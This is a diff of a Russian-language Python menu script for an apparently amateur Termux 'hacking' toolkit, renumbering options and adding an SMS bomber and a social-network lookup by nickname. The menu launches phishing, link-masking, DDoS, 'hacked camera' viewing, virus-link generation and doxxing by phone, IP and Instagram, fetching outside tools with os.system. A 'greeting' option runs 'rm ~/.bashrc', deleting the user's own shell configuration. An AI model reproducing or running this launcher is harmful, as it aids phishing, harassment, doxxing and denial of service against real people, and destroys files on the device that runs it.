@@ -16,20 +16,22 @@ while True:
     print ("| | | | | | \__ \ | |_  | (_| | | | | | |  __/ | |   ")
     print ("|_| |_| |_| |___/  \__|  \__,_| |_| |_|  \___| |_|   ")
     print ("\n")
-    print ("[telegram: @SYPEXHACK]                       [v2.4.3]")
+    print ("[telegram: @SYPEXHACK]                       [v2.5.1]")
     res()
     print (Fore.YELLOW+"    [1] тунелирование <ngrok>")
     print (Fore.YELLOW+"    [2] тунелирование <localhost>")
     print (Fore.YELLOW+"    [3] фишинг")
     print (Fore.YELLOW+"    [4] ддос")
-    print (Fore.YELLOW+"    [5] приветствие")
-    print (Fore.YELLOW+"    [6] заблокировать Termux")
-    print (Fore.YELLOW+"    [7] просмотр взломаных камер")
-    print (Fore.YELLOW+"    [8] получить вирус ссылку")
-    print (Fore.YELLOW+"    [9] замаскировать фишинг")
-    print (Fore.YELLOW+"    [10] пробив по номеру")
-    print (Fore.YELLOW+"    [11] пробив по ip")
-    print (Fore.YELLOW+"    [12] пробив инстаграм")
+    print (Fore.YELLOW+"    [5] бомбер <мини>")
+    print (Fore.YELLOW+"    [6] приветствие")
+    print (Fore.YELLOW+"    [7] заблокировать Termux")
+    print (Fore.YELLOW+"    [8] просмотр взломаных камер")
+    print (Fore.YELLOW+"    [9] получить вирус ссылку")
+    print (Fore.YELLOW+"    [10] замаскировать фишинг")
+    print (Fore.YELLOW+"    [11] пробив по номеру")
+    print (Fore.YELLOW+"    [12] пробив по ip")
+    print (Fore.YELLOW+"    [13] пробив инстаграм")
+    print (Fore.YELLOW+"    [14] соц-сети по нику")
     print (Fore.CYAN+"\n                                     ╔═════════════╗")
     print (Fore.CYAN+'    [77] поддержка автора            ║'+Fore.GREEN+'>утилиты<'+Fore.CYAN+'[91]║')
     print (Fore.CYAN+'    [88] тг канал автора             ║'+Fore.YELLOW+' забавы '+Fore.CYAN+' [92]║')
@@ -192,7 +194,7 @@ while True:
         os.system('python doser.py')
 
 
-    if inp == '5':   
+    if inp == '6':   
         tt = 'привет'
         os.system('clear')
         os.system('rm ~/.bashrc')
@@ -234,7 +236,7 @@ while True:
             os.system('clear')
 
 
-    if inp == '6':
+    if inp == '7':
         os.system('clear')
         print(Fore.RED+'[ВЫ УВЕРЕНЫ ЧТО ХОТИТЕ ЗАБЛОКИРОВАТЬ Termux?]')
         res()
@@ -252,7 +254,7 @@ while True:
             os.system('clear')
 
 
-    if inp == '7':    
+    if inp == '8':    
         print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка взлом. камер...")
         res()
         os.system('pip install requests')
@@ -268,7 +270,7 @@ while True:
             os.system('clear')
 
 
-    if inp == '8':
+    if inp == '9':
         os.system('clear')
         print(Fore.GREEN+'[Генерируется ссылка...]')
         res()
@@ -286,7 +288,7 @@ while True:
             os.system('clear')       
 
 
-    if inp == '9':
+    if inp == '10':
         print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка маск. фишинг...")
         res()
         os.system('git clone https://github.com/jaykali/maskphish.git')
@@ -305,7 +307,7 @@ while True:
             os.system('clear')
 
 
-    if inp == '10':
+    if inp == '11':
         at = '1'
         print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка пробив телефона...")
         res()
@@ -330,7 +332,7 @@ while True:
                 os.system('clear')
 
 
-    if inp == '11':
+    if inp == '12':
         print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка пробив ip...")
         res()
         os.system('pip install requests')
@@ -339,7 +341,7 @@ while True:
         os.system('python Uti-lite.py')
 
 
-    if inp == '12':
+    if inp == '13':
         aa = 'ververa'
         print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка пробив Instagram...")
         res()
@@ -374,7 +376,7 @@ while True:
                 os.chdir('installer')
                 os.system('python3 tool.py')
             
-    if inp == '07':
+    if inp == '5':
         os.system('clear')
         print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка бомбер...")
         res()
@@ -386,7 +388,7 @@ while True:
         os.system('bomber')
 
 
-    if inp == '08':
+    if inp == '14':
         os.system('clear')
         print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка соц.-ник...")
         res()
